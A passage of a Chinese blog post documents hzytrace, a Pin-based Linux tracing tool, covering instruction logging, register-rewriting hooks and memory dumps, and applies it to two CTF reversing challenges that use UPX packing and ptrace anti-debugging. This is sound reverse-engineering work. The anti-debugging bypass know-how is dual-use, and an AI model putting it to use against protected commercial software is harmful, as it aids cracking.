<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./pin -t hzytrace.so -syscall  0 -- ls -al</span><br></pre></td></tr></table></figure>

<h3 id="2-3-指令运行状态记录"><a href="#2-3-指令运行状态记录" class="headerlink" title="2.3 指令运行状态记录"></a>2.3 指令运行状态记录</h3><p>功能类似hutrace，开启指令状态记录时则不需要再记录bbllog功能中的指令反汇编结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./pin -t hzytrace.so -inslog -- ls -al</span><br></pre></td></tr></table></figure>

<p>trace的部分日志结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">B0x402a00|0x402a2c</span><br><span class="line">	I0x402a00|push r15                                   | M:0x7fffffffd930 | D:0x0 | r15:0x0</span><br><span class="line">	I0x402a02|push r14                                   | M:0x7fffffffd928 | D:0x0 | r14:0x0</span><br><span class="line">	I0x402a04|push r13                                   | M:0x7fffffffd920 | D:0x7fffffffda10 | r13:0x7fffffffda10</span><br><span class="line">	I0x402a06|push r12                                   | M:0x7fffffffd918 | D:0x4049a0 | r12:0x4049a0</span><br><span class="line">	I0x402a08|push rbp                                   | M:0x7fffffffd910 | D:0x413bb0 | rbp:0x413bb0</span><br><span class="line">	I0x402a09|push rbx                                   | M:0x7fffffffd908 | D:0x0 | rbx:0x0</span><br><span class="line">	I0x402a0a|mov ebx, edi                               | rdi:0x2 | rbx:0x0 </span><br><span class="line">	I0x402a0c|mov rbp, rsi                               | rsi:0x7fffffffda18 | rbp:0x413bb0 </span><br><span class="line">	I0x402a0f|sub rsp, 0x388                             | rsp:0x7fffffffd908 </span><br><span class="line">	I0x402a16|mov rdi, qword ptr [rsi]                   | M:0x7fffffffda18 | D:0x7fffffffddeb | rdi:0x2</span><br><span class="line">	I0x402a19|mov rax, qword ptr fs:[0x28]               | M:0x7fffe39a3828 | D:0x8cde58e761386e00 | rax:0x402a00</span><br><span class="line">	I0x402a22|mov qword ptr [rsp+0x378], rax             | M:0x7fffffffd8f8 | D:0x413bfd | rax:0x8cde58e761386e00</span><br><span class="line">	I0x402a2a|xor eax, eax                               | rax:0x8cde58e761386e00 </span><br><span class="line">C0x402a2c|0x40db00</span><br><span class="line">	I0x402a2c|call 0x40db00                              | M:0x7fffffffd578 | D:0x7fffe46f84e8</span><br></pre></td></tr></table></figure>

<h3 id="2-4-指定trace指令起始、结束地址"><a href="#2-4-指定trace指令起始、结束地址" class="headerlink" title="2.4 指定trace指令起始、结束地址"></a>2.4 指定trace指令起始、结束地址</h3><p>指定需要trace的指令范围，需要设置为基本块的开始或结束地址(为了便于展示，可以取消全局的syscall调用打印)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./pin -t hzytrace.so -inslog -logstart 0x402a00 -logend 0x402c7c -syscall 0 -- ls -al</span><br></pre></td></tr></table></figure>

<p>trace的结果信息中只会打印到0x402c7c的前一个基本块信息结束，并不会打印0x402c7c所在基本块的指令信息等。</p>
<h3 id="2-5-指定需要trace的模块"><a href="#2-5-指定需要trace的模块" class="headerlink" title="2.5 指定需要trace的模块"></a>2.5 指定需要trace的模块</h3><p>利用target参数指定需要trace的模块：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./pin -t hzytrace.so -inslog -target mytestso.so -syscall 0 -- ./test.out</span><br></pre></td></tr></table></figure>

<p>trace得到的部分结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~25933~~ libdl.so.2!dlsym N:0x7</span><br><span class="line"> 	arg 0: 0x555555756030 (type=long, size=0x8)</span><br><span class="line"> 	arg 1: my_main (type=char*, size=0x0)</span><br><span class="line">   executed libdl.so.2!dlsym returnIp:0x5555555548cb =&gt;</span><br><span class="line"> 	retval: 0x7fffe36f460a (type=int, size=0x4)</span><br><span class="line">//得到mytestso.so!my_main的函数地址</span><br><span class="line"></span><br><span class="line">B0x5555555548cb|0x5555555548e2</span><br><span class="line">	I0x5555555548cb|mov qword ptr [rbp-0x10], rax              | M:0x7fffffffd920 | D:0x0 | rax:0x7fffe36f460a</span><br><span class="line">	I0x5555555548cf|mov rax, qword ptr [rbp-0x10]              | M:0x7fffffffd920 | D:0x7fffe36f460a | rax:0x7fffe36f460a</span><br><span class="line">	I0x5555555548d3|mov edx, 0x3                               | rdx:0x1 </span><br><span class="line">	I0x5555555548d8|mov esi, 0x2                               | rsi:0x7fffe471a0d8 </span><br><span class="line">	I0x5555555548dd|mov edi, 0x1                               | rdi:0x7ffff7ffd948 </span><br><span class="line">C0x5555555548e2|0x7fffe36f460a</span><br><span class="line">	I0x5555555548e2|call rax                                   | M:0x7fffffffd918 | D:0x5555555548cb | rax:0x7fffe36f460a</span><br><span class="line">~~25933~~ mytestso.so!my_main N:0x8</span><br><span class="line">	arg 0: 0x1</span><br><span class="line">	arg 1: 0x2</span><br><span class="line">	arg 2: 0x3</span><br><span class="line">	arg 3: 0x0</span><br><span class="line">B0x7fffe36f460a|0x7fffe36f4622</span><br><span class="line">	I0x7fffe36f460a|push rbp                                   | M:0x7fffffffd910 | D:0x7fffffffd930 | rbp:0x7fffffffd930</span><br><span class="line">	I0x7fffe36f460b|mov rbp, rsp                               | rsp:0x7fffffffd910 | rbp:0x7fffffffd930 </span><br><span class="line">	I0x7fffe36f460e|sub rsp, 0x10                              | rsp:0x7fffffffd910 </span><br><span class="line">	I0x7fffe36f4612|mov dword ptr [rbp-0x4], edi               | M:0x7fffffffd90c | D:0xffffd93000000000 | rdi:0x1</span><br><span class="line">	I0x7fffe36f4615|mov dword ptr [rbp-0x8], esi               | M:0x7fffffffd908 | D:0x100000000 | rsi:0x2</span><br><span class="line">	I0x7fffe36f4618|mov dword ptr [rbp-0xc], edx               | M:0x7fffffffd904 | D:0x200005555 | rdx:0x3</span><br><span class="line">	I0x7fffe36f461b|lea rdi, ptr [rip+0x1f]                    | rip:0x7fffe36f461b | rdi:0x1</span><br></pre></td></tr></table></figure>

<h2 id="3-其它功能"><a href="#3-其它功能" class="headerlink" title="3. 其它功能"></a>3. 其它功能</h2><h3 id="3-1-任意地址hook插件"><a href="#3-1-任意地址hook插件" class="headerlink" title="3.1 任意地址hook插件"></a>3.1 任意地址hook插件</h3><p>这里继续使用hutrace的linux应用文章中的例子进行演示，将原本程序中打印函数的参数从1-8修改为11-18，首先在hzytrace_linux.config设置需要hook的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hook|0x400706</span><br></pre></td></tr></table></figure>
<p>在hzytrace中简化了插件的加载和调用方式，只需要设置需要hook的的地址即可，而且不支持hutrace提供的函数开始、结束同时hook，如果有类似需求，可以在返回地址处添加新的返回地址hook条目，hzytrace运行到0x400706地址处时会加载mypinplugin.so并调用导出函数名为f_hookpre_0x400706的导出函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int  f_hookpre_0x400706(bluepill_tls *tdata,ADDRINT *r_RDI,ADDRINT *r_RSI,ADDRINT *r_RDX,ADDRINT *r_RCX,ADDRINT *r_R8,ADDRINT *r_R9,ADDRINT *r_RAX,ADDRINT *r_RBX,ADDRINT *r_RBP,ADDRINT *r_RSP,ADDRINT *r_R10,ADDRINT *r_R11,ADDRINT *r_R12,ADDRINT *r_R13,ADDRINT *r_R14,ADDRINT *r_R15)</span><br><span class="line">&#123;</span><br><span class="line">	*r_RDI = 11;</span><br><span class="line">	*r_RSI = 12;</span><br><span class="line">	*r_RDX = 13;</span><br><span class="line">	*r_RCX = 14;</span><br><span class="line">	*r_R8 = 15;</span><br><span class="line">	*r_R9 = 16;</span><br><span class="line">	*(ADDRINT *)(*r_RSP + (7-6) * 8) = 17;</span><br><span class="line">	*(ADDRINT *)(*r_RSP + (8-6) * 8) = 18;</span><br><span class="line">	//写入到trace的log日志中</span><br><span class="line">	(*tdata-&gt;file_write)(tdata-&gt;threadid, tdata-&gt;buffer, tdata-&gt;OutFile, &quot;[hook]|test r_RDI:%p\n&quot;,*r_RDI);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mypinplugin.so编译时可以使用以下编译选项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//x64</span><br><span class="line">g++ -fPIC -shared -o mypinplugin.so mypinPlugin.cpp  -m64 -D X86_64 -Wl,--hash-style=sysv</span><br><span class="line">//x32</span><br><span class="line">g++ -fPIC -shared -o mypinplugin.so mypinPlugin.cpp  -m32 -D X86_32 -Wl,--hash-style=sysv</span><br></pre></td></tr></table></figure>
<p>同时注意因为pin的限制，插件中无法引用其它系统的libc.so文件，故不建议在hook函数中引用api函数实现较为复杂的功能，如果确有此类需求，可以尝试编译成静态的so文件或者编译一个main函数为空、仅导出功能函数的pin插件加载，使用hutrace则不受此限制。</p>
<h3 id="3-2-内存dump功能"><a href="#3-2-内存dump功能" class="headerlink" title="3.2 内存dump功能"></a>3.2 内存dump功能</h3><p>根据hzytrace在运行时输出的调试信息中测试程序soTest加载后的代码范围0x400000-400b43，来演示下hzytrace的内存dump功能，在hzytrace_linux.config设置需要dump的时机以及需要dump的内存地址以及内存大小。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dump|0x400706|0x400000|0xb43</span><br></pre></td></tr></table></figure>
<p>同样设置代码运行到0x400706时dump地址从0x400000开始大小为0xb43字节的内存数据，运行测试程序后，在Result目录中对应的日志记录文件夹中生成内存dump文件。</p>
<ul>
<li><p>dump功能可以和hook功能指定同一个地址，即可执行到该地址后进行dump操作，又可以在当前地址处使用hook功能加载插件（hutrace则不支持）。</p>
</li>
<li><p>dump功能同样可以在不同运行地址状态指定相同地址范围的内存进行提取，dump的文件名结尾会进行累加，可以比对不同状态下内存状态信息改变情况。</p>
</li>
</ul>
<h2 id="4-实例演示"><a href="#4-实例演示" class="headerlink" title="4. 实例演示"></a>4. 实例演示</h2><p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC4%E7%AF%87%E4%B9%8B%E8%A1%8D%E7%94%9F%E5%B7%A5%E5%85%B7hzytrace/%E5%9B%BE%E7%89%872.png" alt=""></p>
<h3 id="4-1-hide"><a href="#4-1-hide" class="headerlink" title="4.1 hide"></a>4.1 hide</h3><p>来看一个几年前qwb里ling博狗的例子“hide”，用了upx壳并且修改了一些upx标识，无法自动脱壳，程序本身使用了ptrace的PTRACE_TRACEME反调试（使用strace跟踪会退出），而且本身程序使用syscall完成读写、还使用了一处虚假的flag校验函数进行混淆，常规方式可以使用“catch syscall ptrace”逐步定位关键代码处，下面我们尝试使用hzytrace处理类似程序（hutrace虽然可以正常处理upx和PTRACE_TRACEME，但是这个程序无法正常trace，原因没有深入研究）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># huhu @ huhu in ~/Desktop/pin-3.5 [7:30:39] </span><br><span class="line">$ ./pin -t hzytrace.so -bbllog -- ./hide</span><br><span class="line">[INFO] Configuring Pintool</span><br><span class="line">[INFO] Starting instrumented program</span><br><span class="line"></span><br><span class="line">[INFO] Opening file</span><br><span class="line">./Results/2022_05_26_07_31_43//TRACER/hzytrace.hide.37360.0.1653568303.out</span><br><span class="line">Enter the flag:</span><br><span class="line">1234567890</span><br><span class="line">You are wrong</span><br></pre></td></tr></table></figure>
<p>查看日志直接搜索输入的“1234567890”（trace的日志500m文件使用010edit秒搜）：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC4%E7%AF%87%E4%B9%8B%E8%A1%8D%E7%94%9F%E5%B7%A5%E5%85%B7hzytrace/%E5%9B%BE%E7%89%873.png" alt=""></p>
<p>因为hzytrace仅对运行的代码进行记录，下面把这段内存进行dump拖进ida里查看完整的代码逻辑，在hzytrace_linux.config中设置执行到0x4c8eeb代码处时自动dump地址为0x400000代码处的内存（可设置关闭aslr固定内存地址）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dump|0x4c8eeb|0x400000|0xca000</span><br></pre></td></tr></table></figure>
<p>再次运行在对应的result日志目录生成内存dump文件，拖进ida，查看上述记录的日志中对应代码：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC4%E7%AF%87%E4%B9%8B%E8%A1%8D%E7%94%9F%E5%B7%A5%E5%85%B7hzytrace/%E5%9B%BE%E7%89%874.png" alt=""></p>
<p>后面分析算法既可以ida静态，也可使用hzytrace的inslog参数追踪代码执行过程的寄存器及内存信息辅助分析算法，亦可使用gdb根据日志中的ptrace调用信息对其反调试进行绕过并继续调试，不再赘述。</p>
<h3 id="4-2-bytepacker"><a href="#4-2-bytepacker" class="headerlink" title="4.2 bytepacker"></a>4.2 bytepacker</h3><p>这个程序来自某次分享的ctf赛题，使用双进程方式进行反调试，但是没有使用特别复杂的debugblock方式，所以依旧可以使用hzytrace进行指令流的trace（bbllog功能），但是无法使用inslog功能，全指令插桩会影响其执行流程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./pin -t hzytrace.so -bbllog -- ./bytepacker</span><br><span class="line">[INFO] Configuring Pintool</span><br><span class="line">[INFO] Starting instrumented program</span><br><span class="line"></span><br><span class="line">[INFO] Opening file</span><br><span class="line">./Results/2022_05_29_08_46_16//TRACER/hzytrace.bytepacker.47505.0.1653831976.out</span><br><span class="line">[INFO] Fork New Process</span><br><span class="line">[INFO] Opening file</span><br><span class="line">./Results/2022_05_29_08_46_16//TRACER/hzytrace.bytepacker.47509.0.1653831976.out</span><br><span class="line">Show me the flag:</span><br><span class="line">&gt;&gt; 1234567890</span><br><span class="line">No, not this one.%</span><br></pre></td></tr></table></figure>
<p>同样可以在trace的日志中直接搜索到使用syscall方式读取输入的测试flag的代码位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">B0x7fffe42f6359|0x7fffe42f635e</span><br><span class="line">	D0x7fffe42f6359|mov eax, 0x0</span><br><span class="line">	D0x7fffe42f635e|syscall </span><br><span class="line">S|read:0</span><br><span class="line">SysEnter|syscall_read|0x0|0x7ffff7fff420|0x400|</span><br><span class="line"> 	arg 0: &lt;null&gt; (type=long, size=0x8)</span><br><span class="line"> 	arg 2: 0x400 (type=int, size=0x4)</span><br><span class="line">SysExit|read</span><br><span class="line"> 	arg 1: 0x7ffff7fff420</span><br><span class="line">000000: 31 32 33 34 35 36 37 38 39 30 30 0a 00 00 00 00  12345678900.....</span><br><span class="line">......//省略部分显示</span><br><span class="line"> (type=__out hex^ARG2*, size=0x400)</span><br><span class="line">B0x7fffe42f6360|0x7fffe42f6366</span><br><span class="line">	D0x7fffe42f6360|cmp rax, 0xfffffffffffff001</span><br><span class="line">	D0x7fffe42f6366|jnb 0x7fffe42f6399</span><br><span class="line">......//省略部分显示</span><br><span class="line">B0x7fffe42f63b0|0x7fffe42f63b7</span><br><span class="line">	D0x7fffe42f63b0|cmp dword ptr [rip+0x2d2389], 0x0</span><br><span class="line">	D0x7fffe42f63b7|jnz 0x7fffe42f63c9</span><br><span class="line">B0x7fffe42f63b9|0x7fffe42f63be</span><br><span class="line">	D0x7fffe42f63b9|mov eax, 0x1</span><br><span class="line">	D0x7fffe42f63be|syscall </span><br><span class="line">S|write:1</span><br><span class="line">SysEnter|syscall_write|0x1|0x7ffff7fff010|</span><br><span class="line"> 	arg 0: 0x1 (type=long, size=0x8)</span><br><span class="line"> 	arg 1: No, not this one.5;74mflag[m:</span><br><span class="line"> (type=char*, size=0x0)</span><br><span class="line">SysExit|write</span><br></pre></td></tr></table></figure>
<p>在hzytrace_linux.config中设置dump内存(关闭aslr的情况下，查看0x7fffe42f6360代码所在内存范围，确保内存地址固定)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dump|0x7fffe42f6360|0x7fffe41f7000|0x1c0000</span><br></pre></td></tr></table></figure>
<p>后续可以据此静态分析,同样也可以向上述hide一样对照trace日志中父进程对子进程的操作进行针对性的处理，只是不能支持inslog功能打印寄存器及引用的内存状态了，父进程的处理代码地址可简单定位如下：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC4%E7%AF%87%E4%B9%8B%E8%A1%8D%E7%94%9F%E5%B7%A5%E5%85%B7hzytrace/%E5%9B%BE%E7%89%875.png" alt=""></p>
<p>实际上像一些更复杂的debugblock代码等使用hzytrace处理子进程时也会崩溃，有的情况下可以通过pin提供的接口对其进行绕过，但是代价略大点，同样后续有好的方案了会进行更新。</p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>前面的文章中提到hzytrace一个主要目的是为了应对linux平台下一些程序无法使用hutrace处理的问题，当然不止是上面提到的一些小众的ctf赛题，pin的接口相对更为丰富，hzytrace也只是相对hutrace稍微简化了下，功能整体来说保持一致。</p>
<p>github地址：<a href="https://github.com/huhu0706/hzytrace" target="_blank" rel="noopener">https://github.com/huhu0706/hzytrace</a></p>
]]></content>
      <tags>
        <tag>工具</tag>
        <tag>调试器</tag>
        <tag>hutrace</tag>
        <tag>Linux</tag>
        <tag>pin</tag>
        <tag>hzytrace</tag>
      </tags>
  </entry>
</search>
